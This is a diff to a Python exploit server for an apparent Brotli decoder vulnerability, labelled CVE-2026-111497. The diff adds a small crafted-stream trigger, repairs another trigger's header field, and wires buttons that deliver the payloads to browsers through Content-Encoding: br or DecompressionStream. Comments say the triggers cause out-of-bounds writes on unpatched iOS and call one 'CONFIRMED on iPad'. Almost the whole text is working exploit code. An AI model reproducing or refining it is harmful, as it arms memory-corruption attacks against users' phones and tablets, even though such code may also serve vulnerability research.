@@ -77,17 +77,81 @@ def varlen_u8(bits, value):
 
 
 # ---------------------------------------------------------------------------
-# REAL TRIGGER: syrex1013 approach (small, ~512KB)
+# REAL TRIGGER: small dimas-style (~6KB)
+# NBLTYPESI=2, initial command block length=4096 (symbol 13, 12 extra bits)
+# Same OOB path as the full dimas but only 4096 commands instead of 16M
+# ---------------------------------------------------------------------------
+
+def craft_small_trigger():
+    bits = Bits()
+
+    # Window: WBITS=17
+    bits.put(1, 1)
+    bits.put(0, 3)
+    bits.put(2, 3)
+
+    # Metablock: ISLAST=0, MNIBBLES=2, MLEN-1=0xFFFFFF (24 bits)
+    bits.put(0, 1)
+    bits.put(2, 2)
+    bits.put(0xFFFFFF, 24)
+    bits.put(0, 1)     # ISUNCOMPRESSED=0
+
+    # NBLTYPESL=1
+    varlen_u8(bits, 0)
+    # NBLTYPESI=2 (KEY: two insert/copy block types)
+    varlen_u8(bits, 1)
+    one_symbol_tree(bits, 4, 0)       # block type tree
+    # Block length tree: symbol 13 = range 4097-8192, 12 extra bits
+    one_symbol_tree(bits, 26, 13)
+    bits.put(0xFFF, 12)               # extra bits → initial length = 4097 + 0xFFF = 8192
+    # NBLTYPESD=1
+    varlen_u8(bits, 0)
+    bits.put(3, 6)     # NPOSTFIX + NDIRECT
+    bits.put(0, 2)     # context mode
+    # Context map
+    varlen_u8(bits, 0)
+    varlen_u8(bits, 0)
+
+    # Huffman trees
+    one_symbol_tree(bits, 256, 0)     # literal
+    one_symbol_tree(bits, 704, 130)   # insert/copy type 0
+    one_symbol_tree(bits, 704, 130)   # insert/copy type 1
+    one_symbol_tree(bits, 400, 184)   # distance
+
+    # 8192 commands of 11-bit distance_extra to exhaust block counter
+    distance_extra = 4
+    command_count = 8192
+    completed = 0
+    while bits.used and completed < command_count:
+        bits.put(distance_extra, 11)
+        completed += 1
+
+    group = Bits()
+    for _ in range(8):
+        group.put(distance_extra, 11)
+    group_bytes = group.finish()
+    groups, tail = divmod(command_count - completed, 8)
+    bits.aligned(group_bytes * groups)
+    for _ in range(tail):
+        bits.put(distance_extra, 11)
+
+    trigger = bits.finish()
+    return trigger + b"\x00" * 3 + b"\xFF" * 127
+
+
+# ---------------------------------------------------------------------------
+# REAL TRIGGER: syrex1013 approach (fixed, ~512KB)
 # NBLTYPESL=2, block type 0 length=1, block type 1 length=0
 # Double exhaustion forces DecodeBlockTypeAndLength on invalid state
+# FIXED: MNIBBLES changed from 0 to 1 (non-empty meta-block)
 # ---------------------------------------------------------------------------
 
 def craft_syrex_trigger():
     w = Bits()
     w.put(0, 1)        # WBITS=16
     w.put(0, 1)        # ISLAST=0
-    w.put(0b00, 2)     # MNIBBLES=0
-    w.put(3, 4)        # MLEN-1=3 -> MLEN=4
+    w.put(0b01, 2)     # MNIBBLES=1 (FIXED: was 0b00 which creates empty meta-block)
+    w.put(3, 20)        # MLEN-1=3 -> MLEN=4 (20 bits for MNIBBLES=1: 5 nibbles)
 
     w.put(0, 1)        # ISUNCOMPRESSED=0
 
@@ -232,6 +296,9 @@ LEGACY_PAYLOADS = {
 print("Generating payloads...")
 t0 = time.time()
 
+SMALL_PAYLOAD = craft_small_trigger()
+print(f"  small: {len(SMALL_PAYLOAD):,} bytes ({time.time()-t0:.1f}s)")
+
 SYREX_PAYLOAD = craft_syrex_trigger()
 print(f"  syrex: {len(SYREX_PAYLOAD):,} bytes ({time.time()-t0:.1f}s)")
 
@@ -241,6 +308,7 @@ DIMAS_PAYLOAD = craft_dimas_trigger()
 print(f"  dimas: {len(DIMAS_PAYLOAD):,} bytes ({time.time()-t1:.1f}s)")
 
 ALL_PAYLOADS = {
+    "small": SMALL_PAYLOAD,
     "syrex": SYREX_PAYLOAD,
     "dimas": DIMAS_PAYLOAD,
 }
@@ -299,16 +367,17 @@ is discarded. On unpatched decoders (iOS 27.0.1), this causes an OOB write.
 
 <h2>Real Triggers</h2>
 <div class="note explain">
-<b>syrex</b> (~512KB): NBLTYPESL=2, block type 0 len=1 + type 1 len=0.
-Double exhaustion forces stale Huffman state.<br>
-<b>dimas</b> (~23MB): NBLTYPESI=2, 16M commands exhaust counter.
-Attacker-controlled block switch data follows. <i>Large - may take time.</i>
+<b>small</b> (~6KB): dimas-style NBLTYPESI=2, 8192 commands. Fastest test.<br>
+<b>syrex</b> (~512KB): NBLTYPESL=2 double exhaustion (MNIBBLES fixed).<br>
+<b>dimas</b> (~23MB): NBLTYPESI=2, 16M commands. <b>CONFIRMED</b> on iPad.
 </div>
 <div class="row">
+<button class="red" onclick="fire('small')">small (6KB)</button>
 <button class="red" onclick="fire('syrex')">syrex (512KB)</button>
 <button class="red" onclick="fireLarge('dimas')">dimas (23MB)</button>
 </div>
 <div class="row">
+<button class="purple" onclick="fireDS('small')">DS: small</button>
 <button class="purple" onclick="fireDS('syrex')">DS: syrex</button>
 <button class="purple" onclick="fireDS('dimas')">DS: dimas (slow)</button>
 </div>
@@ -535,7 +604,7 @@ def main():
     server = http.server.HTTPServer(('0.0.0.0', PORT), Handler)
     print(f"\nCVE-2026-111497 Brotli Trigger Server v4")
     print(f"  http://0.0.0.0:{PORT}/")
-    print(f"  Real triggers: syrex ({len(SYREX_PAYLOAD):,}B), dimas ({len(DIMAS_PAYLOAD):,}B)")
+    print(f"  Real triggers: small ({len(SMALL_PAYLOAD):,}B), syrex ({len(SYREX_PAYLOAD):,}B), dimas ({len(DIMAS_PAYLOAD):,}B)")
     print(f"  Legacy: {[k for k in LEGACY_PAYLOADS]}")
     print(f"  /br/<name>  = Content-Encoding: br")
     print(f"  /raw/<name> = raw bytes (for DecompressionStream)")
